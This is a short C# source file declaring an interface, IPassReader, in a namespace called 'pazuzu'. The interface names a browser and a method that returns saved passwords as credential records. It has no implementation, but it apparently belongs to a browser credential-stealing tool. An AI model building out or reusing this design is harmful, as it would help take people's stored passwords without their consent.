using System.Collections.Generic;

namespace pazuzu;

internal interface IPassReader
{
	string BrowserName { get; }

	IEnumerable<CredentialModel> ReadPasswords();
}
